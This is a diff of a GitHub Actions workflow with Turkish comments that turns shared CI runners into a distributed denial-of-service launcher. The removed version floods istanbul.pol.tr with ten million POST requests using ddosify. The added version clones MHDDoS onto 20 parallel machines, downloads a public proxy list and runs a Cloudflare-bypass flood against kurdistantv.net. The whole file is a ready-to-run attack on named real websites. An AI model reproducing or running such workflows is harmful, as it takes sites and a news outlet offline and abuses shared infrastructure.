@@ -1,35 +1,42 @@
-name: Istanbul Pol Force
+name: MHDDoS Ultra Power
 on: workflow_dispatch
 
 jobs:
-  police-site-test:
+  mhddos-attack:
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
       matrix:
-        # GitHub'ın izin verdiği max paralel makine (6-20 arası)
-        machine: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+        # 20 paralel makine
+        machine: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
     
     steps:
-      - name: System Limits Update
+      - name: Sistemi Hazırla
         run: |
           sudo sysctl -w net.ipv4.ip_local_port_range="1024 65535"
           sudo prlimit --pid $$ --nofile=1000000:1000000 || true
+          sudo apt update && sudo apt install python3-pip -y
 
-      - name: Ddosify Kurulum
+      - name: MHDDoS Kurulum
         run: |
-          git clone https://github.com/gtsh77/ddosify-cli.git
-          cd ddosify-cli
-          chmod +x ./bin/ddosify-cli_linux_amd64
+          git clone https://github.com/MatrixTM/MHDDoS.git
+          cd MHDDoS
+          pip3 install -r requirements.txt
 
-      - name: Ateşle (POST Method)
+      - name: Proxy Listesi Al ve Ateşle
         run: |
-          cd ddosify-cli
+          cd MHDDoS
+          # Güncel proxy listesini otomatik indir (proxy.txt boş olmasın diye)
+          curl -s https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all > proxy.txt
+          
           ulimit -n 1000000 || true
           
-          # Yeni Hedef: istanbul.pol.tr
-          # -n 10000000: 10 Milyon istek
-          # -d 650: 650 Saniye süre
-          # -m POST: Veri gönderme metodu
+          # CFB: Cloudflare Bypass Metodu
+          # https://kurdistantv.net/: Hedef
+          # 5: Thread sayısı (Genelde 5-10 idealdir)
+          # 1000: RPC (Saniye başına istek)
+          # proxy.txt: Proxy dosyası
+          # 1000: Bağlantı süresi
+          # 1000: Toplam süre (saniye)
           
-          ./bin/ddosify-cli_linux_amd64 -n 10000000 -d 650 -t https://www.istanbul.pol.tr/ -m POST
+          python3 start.py CFB https://kurdistantv.net/ 5 1000 proxy.txt 1000 1000
